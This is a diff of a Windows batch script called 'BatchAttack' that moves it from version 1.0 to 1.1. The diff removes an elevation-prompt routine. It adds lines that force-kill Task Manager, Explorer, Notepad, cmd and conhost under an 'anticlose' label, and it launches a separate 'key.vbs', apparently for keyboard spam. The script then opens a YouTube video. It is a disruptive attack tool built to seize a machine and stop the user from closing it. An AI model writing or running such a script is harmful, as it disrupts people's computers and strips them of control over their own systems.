@@ -1,33 +1,6 @@
 @echo off
-title BatchAttack Version 1.0 by SleekZ
-:: BatchGotAdmin
-:-------------------------------------
-REM  --> Check for permissions
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-)
+title BatchAttack Version 1.1 by SleekZ
 
-REM --> If error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-:-------------------------------------- 
 echo Please enter the safe key found on the Github repo!
 :key
 set/p "key=>"
@@ -57,9 +30,12 @@ echo Loading BatchAttack. . .
 ping localhost -n 1 >nul
 ping localhost -n 2 >nul
 
+:anticlose
 taskkill /f /im taskmgr.exe
 taskkill /f /im notepad.exe
 taskkill /f /im explorer.exe
+taskkill /f /im cmd.exe
+taskkill /f /im conhost.exe
 
 goto :shrek
 goto :Keyboardspam
@@ -80,7 +56,7 @@ goto loop
 
 
 :Keyboardspam
-echo Feature not complete!
+start key.vbs
 :keyboarddisabler
 echo Feature not complete!
 :mousedisabler
@@ -91,8 +67,7 @@ echo Feature not complete!
 :shrek
 start https://www.youtube.com/watch?v=pxw-5qfJ1dk
 
-:end
-exit
+
 
 
 
